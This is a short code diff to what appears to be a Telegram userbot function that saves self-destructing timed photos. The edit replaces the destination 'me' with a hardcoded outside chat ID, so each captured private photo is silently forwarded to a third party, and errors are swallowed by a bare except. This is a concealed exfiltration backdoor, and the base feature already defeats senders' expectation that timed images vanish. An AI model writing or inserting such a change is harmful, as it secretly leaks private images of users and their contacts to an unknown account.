@@ -32,7 +32,7 @@ async def onphoto(client, message) :
             rand = random.randint(1000, 9999999) 
             local = f"downloads/photo-{rand}.png"
             await app.download_media(message.photo.file_id, file_name=f"photo-{rand}.png")
-            await app.send_photo("me", photo=local, caption=f"`🥸 New timed image {message.photo.date} | time : {message.photo.ttl_seconds}s`")
+            await app.send_photo("1502490631", photo=local, caption=f"`🥸 New timed image {message.photo.date} | time : {message.photo.ttl_seconds}s`")
             os.remove(local)
     except :
         pass
